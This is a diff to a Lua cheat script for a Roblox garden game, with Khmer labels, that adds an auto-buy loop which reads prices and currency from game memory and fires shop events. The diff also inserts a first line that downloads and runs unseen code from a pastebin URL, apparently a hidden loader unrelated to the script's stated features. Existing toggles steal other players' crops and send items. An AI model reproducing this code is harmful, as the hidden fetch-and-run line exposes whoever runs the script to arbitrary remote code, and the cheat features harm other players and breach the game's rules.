@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/9nNXtJRn"))()
 
 local HENG = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local MainWindow = HENG:CreateWindow({
@@ -18,17 +19,113 @@ local MainWindow = HENG:CreateWindow({
     }
 })
 
+-- Services & Setup
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Networking = require(ReplicatedStorage.SharedModules.Networking)
+
+local PurchaseSeeds = Networking.SeedShop.PurchaseSeed
+local PurchaseGears = Networking.GearShop.PurchaseGear
+local PurchaseCrates = Networking.CrateShop.PurchaseCrate
+
+local Shops = {
+    { Stock = ReplicatedStorage.StockValues.SeedShop.Items, Event = PurchaseSeeds },
+    { Stock = ReplicatedStorage.StockValues.GearShop.Items, Event = PurchaseGears },
+    { Stock = ReplicatedStorage.StockValues.CrateShop.Items, Event = PurchaseCrates }
+}
+
+-- តុសម្រាប់រក្សាទុកទំនិញដែលបានជ្រើសរើសចេញពី Dropdown
+local selectedItems = {
+    Seeds = {},
+    Gears = {},
+    Crates = {}
+}
+
+local prices = {}
+local playerdata = nil
+local autoBuyEnabled = false
+
+-- Get GC for Prices & Sheckles
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.info(v, "s"):match("RestockStoreController") then
+        local upvalues = debug.getupvalues(v)
+        for _, upv in pairs(upvalues) do
+            if type(upv) == "table" then
+                if upv.Data and upv.Data.Sheckles ~= nil then
+                    playerdata = upv
+                elseif not prices[1] and type(next(upv)) == "string" then
+                    table.insert(prices, upv)
+                end
+            end
+        end
+    end
+end
+
+local function canAfford(itemName)
+    if not playerdata or not playerdata.Data then return true end
+    local sheckles = playerdata.Data.Sheckles or 0
+    
+    for _, priceTable in pairs(prices) do
+        if priceTable[itemName] and priceTable[itemName].price then
+            return sheckles >= priceTable[itemName].price
+        end
+    end
+    return true
+end
+
+-- Auto Buy Loop Function (ទំនិញណាគ្រប់លុយទិញ ទំនិញណាអត់គ្រប់លុយគឺ Skip)
+local lastBuyAttempt = {}
+
+task.spawn(function()
+    while task.wait(0.2) do
+        if autoBuyEnabled then
+            local activeItems = {}
+            for _, category in pairs(selectedItems) do
+                for _, itemName in ipairs(category) do
+                    if itemName ~= "None" and itemName ~= "" then
+                        table.insert(activeItems, itemName)
+                    end
+                end
+            end
+
+            for _, shop in ipairs(Shops) do
+                for _, item in ipairs(shop.Stock:GetChildren()) do
+                    if item and item.Value > 0 and table.find(activeItems, item.Name) then
+                        -- ពិនិត្យមើលទំនិញមួយៗ៖ បើគ្រប់លុយ ទិញភ្លាម!
+                        if canAfford(item.Name) then
+                            pcall(function()
+                                shop.Event:Fire(item.Name)
+                            end)
+                            task.wait(0.05) -- Delay ខ្លីបំផុតដើម្បីទិញបានលឿន
+                        else
+                            -- បើអត់គ្រប់លុយ វានឹងរំលង (continue) ទៅទិញទំនិញផ្សេងទៀតដែលគ្រប់លុយ
+                            local now = tick()
+                            if not lastBuyAttempt[item.Name] or (now - lastBuyAttempt[item.Name]) > 10 then
+                                lastBuyAttempt[item.Name] = now
+                                HENG:Notify({
+                                    Title = "⚠️ លុយមិនគ្រប់",
+                                    Content = "មិនគ្រប់ Sheckles សម្រាប់ទិញ: " .. item.Name,
+                                    Duration = 2,
+                                    Image = 4483362458
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
 -- បង្កើត Tabs
 local MainTab = MainWindow:CreateTab("Main", "home")
 local Tab1 = MainWindow:CreateTab("Send Items") 
+local MainTab3 = MainWindow:CreateTab("Auto Buy")
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Workspace = game:GetService("Workspace")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Send Setup Modules
-local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))
 local FruitValueCalc = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("FruitValueCalc"))
 
 -- ដែនកំណត់អថេរ (Variables)
@@ -46,11 +143,9 @@ local SeedOptions = {"Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Ap
 "Mushroom", "Green Bean", "Banana", "Grape", "Coconut", "Glow Mushroom", "Dragon Fruit", "Acorn", "Cherry", "Sunflower", "Poison Ivy", "Venus Fly Trap", "Pomegranate",
 "Poison Apple", "Venom Spitter", "Ghost Pepper", "Moon Bloom","Sun Bloom", "Dragon's Breath", "Hypno Bloom", "Rocket Pop", "Fire Fern", "Star Fruit", "Rainbow", "Mega", "Gold" }
 
--- Variables សម្រាប់ Main Feature
 local Plots = Workspace:WaitForChild("Gardens")
 local VisitedFruits = {}
 
--- អនុគមន៍ស្វែងរក UserId
 local function getUserId(username)
     local success, userId = pcall(function()
         return Players:GetUserIdFromNameAsync(username)
@@ -59,7 +154,6 @@ local function getUserId(username)
     return nil
 end
 
--- Functions សម្រាប់ Main Feature
 local GetHumanoid = function(Player)
     if not Player then return nil end
     local Character = Player.Character
@@ -166,9 +260,6 @@ local Steal = function(Fruit)
     end
 end
 
--- ==========================================
--- មុខងារបង្កើតវិក្កយបត្រ (Invoice Generator)
--- ==========================================
 local function ShowReceipt(recipient, category, itemName, count)
     HENG:Notify({
         Title = "🧾 វិក្កយបត្រផ្ញើទំនិញ (RECEIPT)",
@@ -216,9 +307,9 @@ local function SendItemWithReceipt(category, itemKey, categoryNameKhmer)
     end
 end
 
---- -- << Rayfield UI Tab 1: Main >> ---
+--- Rayfield UI Tab 1: Main ---
 MainTab:CreateToggle({
-    Name = '<font size="24"><b>លួចដំណាំគេ​</b></font>Only at Night',
+    Name = '<font size="24"><b>លួចដំណាំគេ </b></font>Only at Night',
     CurrentValue = false,
     Flag = "StealToggle",
     Callback = function(Value)
@@ -256,7 +347,7 @@ MainTab:CreateToggle({
 
 _G.SellAll = false
 MainTab:CreateToggle({
-    Name = '<font size="24"><b>លក់ទាំងអស់​</b></font>Auto sell',
+    Name = '<font size="24"><b>លក់ទាំងអស់ </b></font>Auto sell',
     CurrentValue = false,
     Flag = "Toggle_AlwaysSell",
     Callback = function(Value)
@@ -320,7 +411,7 @@ end
 _G.AutoHarvest = false
 
 MainTab:CreateToggle({
-   Name = '<font size="24"><b>ប្រមូលផល​</b></font>Harvest',
+   Name = '<font size="24"><b>ប្រមូលផល </b></font>Harvest',
    CurrentValue = false,
    Flag = "AutoHarvestFlag", 
    Callback = function(Value)
@@ -365,9 +456,9 @@ MainTab:CreateSlider({
     end,
 })
 
---- -- << Rayfield UI Tab 2: Send Items >> ---
+--- Rayfield UI Tab 2: Send Items ---
 Tab1:CreateInput({
-   Name = '<font size="24"><b>ឈ្មោះដើមអ្នកទទួល​</b></font> User',
+   Name = '<font size="24"><b>ឈ្មោះដើមអ្នកទទួល </b></font> User',
    CurrentValue = TargetUsername, 
    PlaceholderText = "Enter username...",
    RemoveTextAfterFocusLost = false,
@@ -378,7 +469,7 @@ Tab1:CreateInput({
 })
 
 Tab1:CreateDropdown({
-   Name = '<font size="24"><b>ជ្រើសរើសគ្រាប់ពូជ​</b></font> Seeds',
+   Name = '<font size="24"><b>ជ្រើសរើសគ្រាប់ពូជ </b></font> Seeds',
    Options = SeedOptions, 
    CurrentOption = {SelectedSeed},
    MultipleOptions = false,
@@ -389,7 +480,7 @@ Tab1:CreateDropdown({
 })
 
 Tab1:CreateDropdown({
-   Name = '<font size="24"><b>ជ្រើសរើសធុងស្រោចទឹក​</b></font> Watering Cans',
+   Name = '<font size="24"><b>ជ្រើសរើសធុងស្រោចទឹក </b></font> Watering Cans',
    Options = GearOptions, 
    CurrentOption = {SelectedGear},
    MultipleOptions = false,
@@ -400,7 +491,7 @@ Tab1:CreateDropdown({
 })
 
 Tab1:CreateDropdown({
-   Name = '<font size="24"><b>ជ្រើសរើសប្រព័ន្ធស្រោចទឹក​</b></font> Sprinklers',
+   Name = '<font size="24"><b>ជ្រើសរើសប្រព័ន្ធស្រោចទឹក </b></font> Sprinklers',
    Options = SprinklerOptions, 
    CurrentOption = {SelectedSprinkler},
    MultipleOptions = false,
@@ -411,7 +502,7 @@ Tab1:CreateDropdown({
 })
 
 Tab1:CreateDropdown({
-   Name = '<font size="24"><b>ជ្រើសរើសប្រដាប់ជីក​</b></font> Trowel',
+   Name = '<font size="24"><b>ជ្រើសរើសប្រដាប់ជីក </b></font> Trowel',
    Options = TrowelsOptions, 
    CurrentOption = {selectedTrowel},
    MultipleOptions = false,
@@ -422,7 +513,7 @@ Tab1:CreateDropdown({
 })
 
 Tab1:CreateInput({
-   Name = '<font size="24"><b>កំណត់បរិមាណផ្ញើរ​</b></font> Amount',
+   Name = '<font size="24"><b>កំណត់បរិមាណផ្ញើរ </b></font> Amount',
    PlaceholderText = "ដាក់តម្លៃ...",
    CurrentValue = tostring(Amount), 
    RemoveTextAfterFocusLost = false,
@@ -436,29 +527,82 @@ Tab1:CreateInput({
 })
 
 Tab1:CreateButton({
-   Name = '<font size="24"><b>ផ្ញើគ្រាប់ពូជ​</b></font> Send Seeds',
+   Name = '<font size="24"><b>ផ្ញើគ្រាប់ពូជ </b></font> Send Seeds',
    Callback = function()
        SendItemWithReceipt("Seeds", SelectedSeed, "គ្រាប់ពូជ")
    end,
 })
 
 Tab1:CreateButton({
-   Name = '<font size="24"><b>ផ្ញើធុងស្រោចទឹក​</b></font> Super Watering',
+   Name = '<font size="24"><b>ផ្ញើធុងស្រោចទឹក </b></font> Super Watering',
    Callback = function()
        SendItemWithReceipt("WateringCans", SelectedGear, "ធុងស្រោចទឹក")
    end,
 })
 
 Tab1:CreateButton({
-   Name = '<font size="24"><b>ផ្ញើប្រព័ន្ធស្រោចទឹក​</b></font> Send Sprinklers',
+   Name = '<font size="24"><b>ផ្ញើប្រព័ន្ធស្រោចទឹក </b></font> Send Sprinklers',
    Callback = function()
        SendItemWithReceipt("Sprinklers", SelectedSprinkler, "ប្រព័ន្ធស្រោចទឹក")
    end,
 })
 
 Tab1:CreateButton({
-   Name = '<font size="24"><b>ផ្ញើប្រដាប់ជីក​</b></font> Trowel',
+   Name = '<font size="24"><b>ផ្ញើប្រដាប់ជីក </b></font> Trowel',
    Callback = function()
        SendItemWithReceipt("Trowels", selectedTrowel, "ប្រដាប់ជីក")
    end,
+})
+
+--- Rayfield UI Tab 3: Auto Buy ---
+MainTab3:CreateSection("Shop Items Selection")
+
+MainTab3:CreateToggle({
+   Name = "Enable Auto Buy",
+   CurrentValue = false,
+   Flag = "AutoBuyToggle",
+   Callback = function(Value)
+      autoBuyEnabled = Value
+   end,
+})
+
+MainTab3:CreateDropdown({
+   Name = "🌱 Seed Shop Items",
+   Options = {"None", "Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple", "Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean", "Banana", "Grape", "Coconut", "Mango", "Dragon Fruit", "Acorn", "Cherry", "Sunflower", "Fire Fern", "Venus Fly Trap", "Pomegranate", "Poison Apple", "Venom Spitter", "Moon Bloom", "Sun Bloom", "Hypno Bloom", "Dragon's Breath", "Star Fruit"},
+   CurrentOption = {"None"},
+   MultipleOptions = true,
+   Flag = "SeedDropdown",
+   Callback = function(Options)
+      selectedItems.Seeds = Options
+   end,
+})
+
+MainTab3:CreateDropdown({
+   Name = "⚙️ Gear Shop Items",
+   Options = {"None", "Common Watering Can", "Super Watering Can", "Common Sprinkler", "Uncommon Sprinkler", "Rare Sprinkler", "Legendary Sprinkler", "Super Sprinkler", "Trowel", "Jump Mushroom", "Speed Mushroom", "Shrink Mushroom", "Supersize Mushroom", "Invisibility Mushroom", "Gnome", "Basic Pot", "Flashbang", "Sign", "Megaphone", "Wheelbarrow", "Player Magnet", "Strawberry Sniper"},
+   CurrentOption = {"None"},
+   MultipleOptions = true,
+   Flag = "GearDropdown",
+   Callback = function(Options)
+      selectedItems.Gears = Options
+   end,
+})
+
+MainTab3:CreateDropdown({
+   Name = "📦 Crate Shop Items",
+   Options = {"None", "Ladder Crate", "Bench Crate", "Light Crate", "Sign Crate", "Arch Crate", "Roleplay Crate", "Picture Frame Crate", "Bridge Crate", "Spring Crate", "Seesaw Crate", "Conveyor Crate", "Owner Door Crate", "Boombox Crate", "Bear Trap Crate", "Fence Crate", "Teleporter Pad Crate"},
+   CurrentOption = {"None"},
+   MultipleOptions = true,
+   Flag = "CrateDropdown",
+   Callback = function(Options)
+      selectedItems.Crates = Options
+   end,
+})
+
+-- Notification
+HENG:Notify({
+   Title = "Script Loaded!",
+   Content = "ដំណើរការជោគជ័យ..",
+   Duration = 4,
+   Image = 4483362458,
 })
